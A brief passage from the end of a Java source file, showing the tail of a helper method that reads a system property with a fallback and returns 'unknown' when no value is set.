        if (value == null || value.length() == 0) value = System.getProperty(second);
        return value == null || value.length() == 0 ? "unknown" : value;
    }

}
